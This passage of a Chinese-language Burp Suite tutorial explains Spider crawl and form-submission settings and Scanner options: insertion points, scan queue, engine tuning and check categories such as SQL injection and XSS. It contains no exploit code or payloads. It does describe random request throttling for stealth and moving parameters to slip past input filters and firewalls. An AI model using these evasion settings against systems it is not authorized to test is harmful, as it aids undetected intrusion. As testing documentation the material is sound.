href="#5-make-a-non-parameterised-request-to-each-dynamic-page" class="headerlink" title="5)make a non-parameterised request to each dynamic page"></a>5)make a non-parameterised request to each dynamic page</h4><p>如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出添加的站点内容和功能。</p><h4 id="6-maximum-link-depth"><a href="#6-maximum-link-depth" class="headerlink" title="6)maximum link depth"></a>6)maximum link depth</h4><p>这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。</p><h4 id="7-Maximum-parameterized-requests-per-URL"><a href="#7-Maximum-parameterized-requests-per-URL" class="headerlink" title="7)Maximum parameterized requests per URL"></a>7)Maximum parameterized requests per URL</h4><p>请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容，如在URL中的日期参数的日历应用程序。</p><h2 id="Passive-Spidering-被动扫描"><a href="#Passive-Spidering-被动扫描" class="headerlink" title="Passive Spidering(被动扫描)"></a>Passive Spidering(被动扫描)</h2><p><img src="https://wooyun.js.org/images_result/images/2014101711120825072.png" alt="Image045" title="image045.png"></p><h4 id="1-passively-spider-as-you-browse"><a href="#1-passively-spider-as-you-browse" class="headerlink" title="1)passively spider as you browse"></a>1)passively spider as you browse</h4><p>如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。</p><h4 id="2-link-depth-to-associate-with-proxy-requests"><a href="#2-link-depth-to-associate-with-proxy-requests" class="headerlink" title="2)link depth to associate with proxy requests"></a>2)link depth to associate with proxy requests</h4><p>这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。</p><h3 id="Form-Submission"><a href="#Form-Submission" class="headerlink" title="Form Submission"></a>Form Submission</h3><p><img src="https://wooyun.js.org/images_result/images/2014101711120952125.png" alt="Image047" title="image047.png"></p><h4 id="1-individuate-forms"><a href="#1-individuate-forms" class="headerlink" title="1)individuate forms"></a>1)individuate forms</h4><p>这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。</p><h4 id="2-Don’t-submit"><a href="#2-Don’t-submit" class="headerlink" title="2)Don’t submit"></a>2)Don’t submit</h4><p>如果选中这个，Burp Spider 不会提交任何表单。</p><h4 id="3-prompt-for-guidance"><a href="#3-prompt-for-guidance" class="headerlink" title="3)prompt for guidance"></a>3)prompt for guidance</h4><p>如果选中这个，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个 区域，以及是否遍历整个区域。</p><h4 id="4-automatically-submit"><a href="#4-automatically-submit" class="headerlink" title="4)automatically submit"></a>4)automatically submit</h4><p>如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。可以为任意不匹配的字段指定默认值。</p><p>在应用程序通常需要对所有输入域都是有效格式的数据的地方，如果你想通过登记表单 和相似功能自动地 spider，则这个选项会非常有用。在自动地把表单数据提交到广阔范围内 的应用程序时，Burp 使用一组非常成功的规则。当然，如果你遇到有自己需要提交的特定 值的表单字段名时，你可以修改这些或者添加自己的规则。你要小心地使用这个选项，因为 提交了表单里的虚假值有时会导致一些不希望看到操作。</p><p>许多表单包含了多个提交元素，这些会对应用程序进行不同的操作，和发现不同的内容。 你可以配置 Spider 重复通过表单里提交元素的值，向每个表单提交多次，次数低于配置的 最大值。</p><h3 id="Application-Login"><a href="#Application-Login" class="headerlink" title="Application Login"></a>Application Login</h3><p><img src="https://wooyun.js.org/images_result/images/2014101711120998771.png" alt="Image049" title="image049.png"></p><p>登陆表单在应用程序中扮演一个特殊角色，并且你常常会让 Burp 用和处理平常表单不 一样的方式来处理这个表单。使用这个配置，你可以告诉 Spider 在遇到一个表单执行下面 4 种不同操作的一种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.如果你没有证书，或者关注 Spidering 的敏感保护功能，Burp 可以忽略登陆表单。</span><br><span class="line">2.Burp 能交互地为你提示引导，使你能够指定证书。这时默认设置项。</span><br><span class="line">3.Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。</span><br><span class="line">4.在遇到的每个登陆表单时，Burp 能自动地提交特定的证书。 </span><br></pre></td></tr></table></figure><p>在最后一种情况下，任何时间 Burp 遇到一个包含密码域的表单，会提交你配置的密码到密码域，提交你配置用户名到最像用户名的字段域。如果你有应用程序的证书，想让 Spider为你处理登陆，通常情况下这是最好的选项</p><h3 id="Spider-Engine"><a href="#Spider-Engine" class="headerlink" title="Spider Engine"></a>Spider Engine</h3><p><img src="https://wooyun.js.org/images_result/images/2014101711121055065.png" alt="Image051" title="image051.png"></p><p>这些设置控制用于Spidering时发出HTTP请求的引擎。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1)Number of threads----此选项控制并发请求进程数。</span><br><span class="line">2)Number of retries on network failure----如果出现连接错误或其他网络问题，BurpSuite会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class="line">3)Pause before retry----当重试失败的请求，BurpSuite会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器被宕掉、繁忙或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class="line">4)Throttle between requests----BurpSuite可以在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</span><br><span class="line">5)Add random variations to throttle----此选项可以通过降低您的要求的时序模式进一步增加隐身。</span><br></pre></td></tr></table></figure><h3 id="Request-Headers"><a href="#Request-Headers" class="headerlink" title="Request Headers"></a>Request Headers</h3><p>这些设置控制由蜘蛛发出的HTTP请求中使用的请求头。您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 - 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。</p><p>以下选项也可用：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121061095.png" alt="Image053" title="image053.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1)Use HTTP version 1.1----如果选中，Spider会使用HTTP1.1版在其请求;否则，它会使用1.0版。</span><br><span class="line"></span><br><span class="line">2)Use Referer header----如果选中，Spider会要求从另一个页面链接到任何项目时提交相关Referer头。此选项很有用更加紧密地模拟将通过您的浏览器发出的请求，并且还可能需要浏览一些应用程序验证Referer头。</span><br></pre></td></tr></table></figure><h2 id="Scanner功能"><a href="#Scanner功能" class="headerlink" title="Scanner功能"></a>Scanner功能</h2><h3 id="Using-Burp-Scanner"><a href="#Using-Burp-Scanner" class="headerlink" title="Using Burp Scanner"></a>Using Burp Scanner</h3><p>分以下几个步骤来简单使用Scanner 1.设置好代理之后在地址栏输入你要抓取的地址，并且要在Proxy里把拦截关了，随后切换到Scanner的Results就可以看到地址已经在开始扫描咯</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121128756.png" alt="Image055" title="image055.png"></p><p>2.对地址右击还可以导出报告，</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121157380.png" alt="Image057" title="image057.png"></p><p><img src="https://wooyun.js.org/images_result/images/2014101711121141522.png" alt="Image059" title="image059.png"></p><p>Html或者xml随便你以什么格式的，然后一直下一步下一步到如下图选择保存文件到哪</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121154576.png" alt="Image061" title="image061.png"></p><p>我们打开看看，是不是很漂亮呢</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121194134.png" alt="Image063" title="image063.png"></p><p>3.如果扫描出漏洞了我们还可以直接在这针对某个漏洞进行查看，如果想测试的话可以发送到Repeater进行测试哦</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121260493.png" alt="Image065" title="image065.png"></p><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3><p>结果选项卡包含所有的扫描仪已确定，从主动和被动扫描的问题。以一种树型图显示应用程序的内容，其中的问题已经被发现，使用URL分解成域，目录和文件的层次表示。如果您选择一个或多个部分的分支，所有选定的项目将扫描的问题都列出来，用组合在一起的相同类型的问题。您还可以扩大这些问题汇总查看所有的每种类型的个别问题。 如果您选择的问题那么将显示相应的详情，包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)自定义的漏洞，咨询内容包括：</span><br><span class="line">问题类型及其整治的标准描述。</span><br><span class="line">中适用于该问题，并影响其修复任何特定的功能的描述。</span><br><span class="line">2)完整的请求和响应都是依据报告了该问题。在适用的情况，是相关的识别和再现问题的请求和响应的部分在请求和响应消息的编辑器中突出显示。</span><br></pre></td></tr></table></figure><p>通常情况下，测试并验证一个问题最快的方法是使用发送到Repeater。另外，对于GET请求，您可以复制此URL，并将其粘贴到浏览器中。然后，您可以重新发出请求。 Burp扫描报告描述，每一个问题都会给出严重程度（高，中，低，资讯）和置信度（肯定的，坚定的，暂定）的评级。当一个问题一直使用一种技术，本质上是不太可靠（如SQL盲注）确定，Burp会让你意识到这一点，通过丢弃的置信水平存在一定不足。这些额定值应始终被解释为指示性的，你应该根据你的应用程序的功能和业务方面的知识进行审查。</p><p>这个问题已经上市，你可以用它来执行以下操作的上下文菜单：如图所示</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121228957.png" alt="Image067" title="image067.png"></p><h3 id="Report-selected-issues"><a href="#Report-selected-issues" class="headerlink" title="Report selected issues"></a>Report selected issues</h3><p>启动BurpSuite Scanner的报告向导，生成的选定问题的正式报告。 Set severity - 这让你重新分配问题的严重程度。您可以设置严重程度高，中，低，或信息。您还可以标记问题作为假阳性。</p><h3 id="Delect-selected-issues"><a href="#Delect-selected-issues" class="headerlink" title="Delect selected issues"></a>Delect selected issues</h3><p>删除选定问题。请注意，如果你删除了一个问题，Burp重新发现了同样的问题（例如，如果你重新扫描了同样的要求），那么问题将再次报告。相反，如果你是一个假阳性标记的问题，那么这将不会发生。因此，最适合用于清理扫描结果移除你不感兴趣。对于内部的功能不需要您的问题仍然工作在主机或路径删除的问题，您应该使用假阳性的选项。</p><h3 id="Scan-Queue"><a href="#Scan-Queue" class="headerlink" title="Scan Queue"></a>Scan Queue</h3><p>Active Scanning(主动扫描)过程通常包括发送大量请求到服务器为所扫描的每个基本的请求，这可能是一个耗时的过程。当您发送的主动扫描请求，这些被添加到活动扫描队列，它们被依次处理。如图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121261155.png" alt="Image069" title="image069.png"></p><p>扫描队列中显示每个项目的详细信息如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1)索引号的项目，反映该项目的添加顺序。</span><br><span class="line">2)目的地协议，主机和URL 。</span><br><span class="line">3)该项目的当前状态，包括完成百分比。</span><br><span class="line">4)项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。</span><br><span class="line">5)在扫描项目的请求数量进行。</span><br><span class="line">注意 这不是插入点的数量的线性函数 - 观察应用程序行为的反馈到后续攻击的请求，仅仅因为它会为一个测试仪。</span><br><span class="line">6)网络错误的数目遇到的问题。</span><br><span class="line">7)为项目创建的插入点的数量。</span><br></pre></td></tr></table></figure><p>这些信息可以让您轻松地监控个别扫描项目的进度。如果您发现某些扫描进度过于缓慢，可以理解的原因，如大量的插入点，缓慢的应用响应，网络错误等给定这些信息，你就可以采取行动来优化你的扫描，通过改变配置为插入点时，扫描引擎，或正在测试的主动扫描区域。</p><p>你可以双击任何项目在扫描队列显示，到目前为止发现的问题，并查看了基本请求和响应的项目。您可以使用扫描队列的上下文菜单来执行各种操作来控制扫描过程。确切的可用选项取决于所选的项目（S ）的状态，并包括：如下图所示</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121223207.png" alt="Image071" title="image071.png"></p><h3 id="Show-details"><a href="#Show-details" class="headerlink" title="Show details"></a>Show details</h3><p>这将打开显示到目前为止发现的问题的一个窗口，与底座请求和响应的项目。</p><h3 id="Scan-again"><a href="#Scan-again" class="headerlink" title="Scan again"></a>Scan again</h3><p>此复制所选择的项目（S ） ，并将这些队列的末尾。</p><h3 id="Delete-item-S"><a href="#Delete-item-S" class="headerlink" title="Delete item(S)"></a>Delete item(S)</h3><p>这将永久地从队列中删除选定的项目（S ） 。</p><h3 id="Delect-finished-items"><a href="#Delect-finished-items" class="headerlink" title="Delect finished items"></a>Delect finished items</h3><p>这永久删除那些已经完成了队列中的任何项目。</p><h3 id="Automatically-delete-finished-items"><a href="#Automatically-delete-finished-items" class="headerlink" title="Automatically delete finished items"></a>Automatically delete finished items</h3><p>这是否切换扫描器会自动从队列为他们完成删除项目。</p><h3 id="Pause-resume-scanner"><a href="#Pause-resume-scanner" class="headerlink" title="Pause&#x2F;resume scanner"></a>Pause&#x2F;resume scanner</h3><p>这可以暂停和恢复激活扫描仪。如果任何扫描正在进行时，扫描会暂停，而挂起的扫描请求完成后，通常会有一个短暂的延迟。</p><h3 id="Send-to"><a href="#Send-to" class="headerlink" title="Send to"></a>Send to</h3><p>这些选项用于所选项目的基本请求发送到其它Burp(Repeater、Intruder)工具。</p><h3 id="Live-Scanning"><a href="#Live-Scanning" class="headerlink" title="Live Scanning"></a>Live Scanning</h3><p>实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning和live passive两种扫描模式。如图</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121272043.png" alt="Image073" title="image073.png"></p><h3 id="Live-active-scanning"><a href="#Live-active-scanning" class="headerlink" title="Live active scanning"></a>Live active scanning</h3><p>执行现场主动扫描，请执行以下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)配置与目标的细节，你要主动扫描现场主动扫描设置。如果你已经配置了一套全范围的目标为你目前的工作，那么你可以简单地通知Burp主动扫描落在该范围内的每个请求。或者，您可以使用URL匹配规则定义自定义范围。 </span><br><span class="line">2)各地通过BurpProxy通常的方式应用浏览。这将有效地展示Burp要扫描的应用功能。对于每一个独特的所在范围的要求，你通过你的浏览器，Burp会排队主动扫描请求，并将努力走在后台找到漏洞为您服务。</span><br></pre></td></tr></table></figure><h3 id="Live-Passive-Scanning"><a href="#Live-Passive-Scanning" class="headerlink" title="Live Passive Scanning"></a>Live Passive Scanning</h3><p>现场演示被动扫描，请执行以下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)配置具有您要被动地扫描目标的细节live passive scanning。默认情况下，Burp执行所有请求的被动扫描，但你可以限制扫描目标范围，或者使用URL匹配规则的自定义范围。 </span><br><span class="line">2)通过BurpProxy通常的方式应用浏览。这将有效地展示Burp你要扫描的应用功能。</span><br></pre></td></tr></table></figure><h3 id="Options-1"><a href="#Options-1" class="headerlink" title="Options"></a>Options</h3><p>此选项卡包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。</p><h3 id="Attack-Insertion-Points"><a href="#Attack-Insertion-Points" class="headerlink" title="Attack Insertion Points"></a>Attack Insertion Points</h3><p>这些设置控制扫描仪的地方“插入点(insertion points)”到被发送的主动扫描每个基本要求。插入点攻击将被放置，探测漏洞请求中的位置。每个定义的插入点单独扫描。 BurpSuite为您提供细粒度地控制放置插入点，以及这些选项仔细配置会让您量身定制您的扫描到您的目标应用程序的性质。插入点的配置也代表你的扫描速度和全面性之间进行权衡。</p><p>注：除了让Burp自动指定插入点，就可以完全自定义这些，这样你就可以在你想要攻击的地方放在任意一个位置。要使用此功能，将请求发送给Intruder，用payload positions标签来定义通常的方式各插入点的开始和结束，并选择入侵者菜单选项“积极定义扫描插入点” 。您也可以指定以编程方式使用Burp扩展的自定义插入点位置。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121335428.png" alt="Image075" title="image075.png"></p><h4 id="1-Insertion-Point-Locations"><a href="#1-Insertion-Point-Locations" class="headerlink" title="1)Insertion Point Locations"></a>1)Insertion Point Locations</h4><p>这些设定可让您选择，其中插入点应放在请求中的位置的类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URLparameter values - URL查询字符串中标准的参数值。</span><br><span class="line">Body parameter values - 在邮件正文中，包括标准形式生成的参数参数值，属性的多重编码的参数，如上传的文件名， XML参数值和属性，和JSON值。</span><br><span class="line">Cookieparameter values - 的HTTP Cookie的值。</span><br><span class="line">Parameter name - 任意添加的参数的名称。 URL参数总是被添加，并且机身参数也加入到POST请求。测试一个附加的参数名称通常可以检测到被错过，如果只是参数值进行了测试异常的错误。</span><br><span class="line">HTTPheaders - 在引用页和用户代理标头的值。测试这些插入点通常可以检测如SQL注入或跨站脚本持续在日志记录功能的问题。</span><br><span class="line">AMF string parameters- 内AMF编码的邮件的任何字符串数据的值。</span><br><span class="line">REST-style URL parameters - URL的文件路径部分中的所有目录和文件名令牌的值。测试每一个插入点可以并处显著开销，如果你相信应用程序使用这些位置传送参数数据，才应使用。</span><br></pre></td></tr></table></figure><h4 id="2-Change-Parameter-Locations"><a href="#2-Change-Parameter-Locations" class="headerlink" title="2)Change Parameter Locations"></a>2)Change Parameter Locations</h4><p>允许您配置扫描仪将一些类型的插入点到其他地点的请求中，除了测试他们在原来的位置。例如，您可以将每个URL参数到邮件正文中，并重新测试它。或者你可以移动身体的每个参数到一个cookie ，然后重新测试它。</p><p>用这种移动参数方式往往可以绕过防过滤器。许多应用程序和应用程序防火墙执行每个参数输入验证假设每个参数是它的预期位置的要求之内。移动参数到不同的位置可以回避这个验证。当应用程序代码后检索参数来实现其主要的逻辑，它可能会使用一个API，它是不可知的，以参数的位置。如果是这样，那么移动的参数可能可以使用输入，通常会在处理之前被过滤，以达到易受攻击的代码路径。</p><p>下列选项可用于更改参数的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URL to body</span><br><span class="line">URL to cookie</span><br><span class="line">Body to URL</span><br><span class="line">Body to cookie</span><br><span class="line">Cookie to URL</span><br><span class="line">Cookie to body</span><br></pre></td></tr></table></figure><h4 id="3-Nested-Insertion-Points"><a href="#3-Nested-Insertion-Points" class="headerlink" title="3)Nested Insertion Points"></a>3)Nested Insertion Points</h4><p>嵌套的插入时，会使用一个插入点的基值包含可识别的格式的数据。 例如，一个URL参数可能包含Base64编码数据，并且将解码后的值可能又包含JSON或XML数据。与使用启用嵌套插入点的选项，Burp会为输入在每个嵌套级别中的每个单独的项目适合的插入点。 Spider仅包含常规的请求参数请求时使用此选项不征收费用，但允许Burp达到更复杂的应用，数据是在不同的格式封装的攻击面。</p><h4 id="4-Maximum-Insertion-Points-Per-Request"><a href="#4-Maximum-Insertion-Points-Per-Request" class="headerlink" title="4)Maximum Insertion Points Per Request"></a>4)Maximum Insertion Points Per Request</h4><p>无论你的设置选择，对于单个请求插入点的数目，一般视乎该请求的功能，如参数的数目。偶尔，请求可以包含的参数（几百或更多）数量。如果Burp执行的每个参数进行完全扫描，扫描会花费过多的时间量完成。 此设置允许您设置的，将每个基本要求生成插入点的数量的限制，从而防止您的扫描由偏快转为停滞，如果他们遇到含参数庞大的数字请求。在其中插入点的数量是由这个限制缩减的情况下，在有效扫描队列中的项目的条目将显示被跳过的插入点的数量，使您能够手动检查基本要求，并决定是否值得执行完全扫描其所有可能的插入点。</p><h4 id="5-Skipping-Parameters"><a href="#5-Skipping-Parameters" class="headerlink" title="5)Skipping Parameters"></a>5)Skipping Parameters</h4><p>设定让您指定请求参数的Burp应该跳过某些测试。有跳过服务器端注入测试（如SQL注入）和跳过所有检查单独的列表。 服务器端注入测试是比较费时的，因为Burp发送多个请求探测服务器上的各种盲目的漏洞。如果您认为出现请求中的某些参数不容易（例如，内置仅由平台或Web服务器中使用的参数） ，你可以告诉Burp不能测试这些。 （用于测试客户端蝽象跨站点脚本涉及更少的开销，因为测试每个参数规定最小的开销在扫描期间，如果该参数不容易。 ） 如果一个参数是由您不希望测试一个应用程序组件来处理，或者修改一个参数是已知的导致应用程序不稳定跳过所有的测试可能是有用的。 列表中的每个项目指定参数类型，该项目要匹配（名称或值） ，匹配类型（文本字符串或正则表达式） ，表达式匹配。 你可以通过它们的位置（斜线分隔）的URL路径中标识的REST参数。要做到这一点，从参数下拉，“姓名”，从项目下拉“ REST参数” ，并指定您希望从测试中排除的URL路径中的位置的索引号（从1开始） 。您还可以通过值来指定REST参数。</p><h3 id="Active-Scanning-Engine"><a href="#Active-Scanning-Engine" class="headerlink" title="Active Scanning Engine"></a>Active Scanning Engine</h3><p>控制用来做主动扫描时发出HTTP请求的引擎。下列选项可用：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121391377.png" alt="Image077" title="image077.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1)Number of threads - 控制并发请求数。</span><br><span class="line">2)Number of retries on network failure - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class="line">3)Pause before retry - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br></pre></td></tr></table></figure><p><strong>Throttle between requests</strong> - 在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。</p><p><strong>Add random variations to throttle</strong> - 通过降低您的要求的时序模式进一步增加隐身。</p><p><strong>Follow redirections where necessary</strong>- 有些漏洞只能通过下面的重定向进行检测（例如，在一条错误消息，跨站点脚本这是只有下列一个重定向后退还）。因为某些应用程序的问题重定向到包含您所提交的参数值的第三方网址，BurpSuite保护您免受无意中攻击的第三方应用程序，不按照刚刚收取任何重定向。如果所扫描的要求是明确的目标范围之内（即您使用的是目标范围，以控制哪些被扫描的），然后BurpSuite只会跟随重定向是指同一范围内。如果所扫描的要求不在范围内（即你已经手动发起超出范围的请求的扫描），BurpSuite只会跟随重定向其中（a）是在同一台主机&#x2F;端口的请求被扫描;及（b）没有明确涵盖的范围排除规则（如“logout.aspx”）。</p><p>小心使用这些选项可让您微调扫描引擎，根据不同应用对性能的影响，并在自己的处理能力和带宽。如果您发现该扫描仪运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，让您的扫描进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。如果应用程序的功能是这样的：在一个基地的要求执行的操作干扰其他请求返回的响应，你应考虑减少线程数为1，以确保只有一个单碱基请求被扫描的时间。</p><h3 id="Active-Scanning-Optimization"><a href="#Active-Scanning-Optimization" class="headerlink" title="Active Scanning Optimization"></a>Active Scanning Optimization</h3><p>主动扫描逻辑的行为，以反映扫描的目的和目标应用程序的性质。例如，您可以选择更容易发现问题，在一个大型应用程序的快速扫描;或者您可以执行更慢全面扫描，以发现更难，而且需要更多的扫描请求，以检测问题。</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121341699.png" alt="Image079" title="image079.png"></p><p>下列选项可用：</p><p><strong>Scan speed(扫描速度)</strong> - 该选项决定彻底的某些扫描检查，怎么会检查是否有漏洞时。 “Fast(快速)”设置使更少的请求，并检查一些漏洞更少的推导。在“Thorough(彻底)”的设置使更多的请求，并检查更多的衍生类型的漏洞。 “Normal(正常)”设定为中途在两者之间，并且代表速度和完整性之间的适当折衷对于许多应用。</p><p><strong>Scan accuracy(扫描精度)</strong> - 此选项决定的证据表明，扫描仪会报告某些类型的漏洞之前，要求的金额。可以只使用“blind(盲)”的技术，其中，Burp推断可能存在基于某些观察到的行为，如时间延迟或一个差分响应的一个漏洞被检测到的一些问题。因为这些观察到的行为的发生原因，无论如何，在没有相关联的漏洞的影响，该技术本身更容易出现假阳性比其他技术，例如在观察错误消息。试图减少误报，BurpSuite重复某些测试了一些，当一个假定的问题，推断时间，尝试建立提交的输入和观察到的行为之间有可靠的相关性。的准确性选项用于控制BurpSuite会多少次重试这些测试。在“Minimize false negatives(最小化假阴性)”的设置进行重试较少，因此更可能报告假阳性的问题，但也不太可能会错过由于不一致的应用程序行为的真正问题。在“Minimize false positives(最小化误报)”设置进行更多的试，所以是不太可能报告假阳性的问题，但可能会因此错误地错过了一些真正的问题，因为有些重试请求可能只是碰巧不返回结果是测试。 “Normal(正常)”设置为中途两者之间，并代表之间的假阳性和假阴性的问题合适的权衡对于许多应用。</p><p><strong>Use intelligent attack selection(使用智能进攻选择)</strong> - 此选项使通过省略出现无关紧要给每个插入点参数的基值支票扫描更有效率。例如，如果一个参数值包含不正常出现在文件名中的字符，BurpSuite会跳过文件路径遍历检查此参数。使用这个选项，可以加快扫描件，具有相对低的存在缺少实际的漏洞的风险。</p><h3 id="Active-Scanning-Areas"><a href="#Active-Scanning-Areas" class="headerlink" title="Active Scanning Areas"></a>Active Scanning Areas</h3><p>定义哪些是主动扫描过程中进行检查。是检查以下类别可供选择：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121323228.png" alt="Image081" title="image081.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SQL injection(SQL注入) - 这有子选项，以使不同的测试技术（误差为基础，延时测试，布尔条件测试） ，并且也使检查特定于单个数据库类型（ MSSQL ，Oracle和MySQL的） 。</span><br><span class="line">OS command injection(操作系统命令注入) - 这有子选项，以使不同的测试技术.。</span><br><span class="line">Reflected XSS(反映了跨站点脚本)</span><br><span class="line">Stored XSS(存储的跨站点脚本)</span><br><span class="line">File path traversal(文件路径遍历)</span><br><span class="line">HTTP header injection(HTTP头注入)</span><br><span class="line">XML/SOAP injection(XML / SOAP注射)</span><br><span class="line">LDAP injection(LDAP注入)</span><br><span class="line">Open redirection(开放重定向)</span><br><span class="line">Header manipulation(头操纵)</span><br><span class="line">Server-level issues服务器级的问题</span><br></pre></td></tr></table></figure><p>所执行的每个检查增加的请求的数目，以及每个扫描的总时间。您可以打开或关闭个别检查根据您的应用程序的技术知识。例如，如果你知道某个应用程序不使用任何LDAP ，您可以关闭LDAP注入测试。如果你知道哪个后端数据库的应用程序使用，你可以关闭SQL注入检测特定于其他类型的数据库。您也可以选择性地启用基于你如何严格要求你的扫描是检查。例如，您可以配置BurpSuite做应用程序的快速一次过，只为XSS和SQL注入的网址和参数检查，每漏洞类型更全面的测试在每一个插入点之前。</p><h3 id="Passive-Scanning-Areas"><a href="#Passive-Scanning-Areas" class="headerlink" title="Passive Scanning Areas"></a>Passive Scanning Areas</h3><p>自定义的请求和响应的各个方面在被动扫描检查。下列选项可用：</p><p><img src="https://wooyun.js.org/images_result/images/2014101711121316955.png" alt="Image083" title="image083.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Headers--头 </span><br><span class="line">Forms--表格 </span><br><span class="line">Links--链接 </span><br><span class="line">Parameters--参数 </span><br><span class="line">Cookie </span><br><span class="line">MIME类型 </span><br><span class="line">Caching缓存 </span><br><span class="line">Information disclosure--信息披露 </span><br><span class="line">Frameable responses--耐燃反应（“点击劫持”） </span><br><span class="line">ASP.NET的ViewState </span><br><span class="line">需要注意的是被动扫描不会派出自己的任何要求，和每个被动强加检查您的计算机上一个微不足道的处理负荷。不过，你可以禁用检查各个领域，如果你根本就不关心他们，不希望他们出现在扫描结果。</span><br></pre></td></tr></table></figure><h2 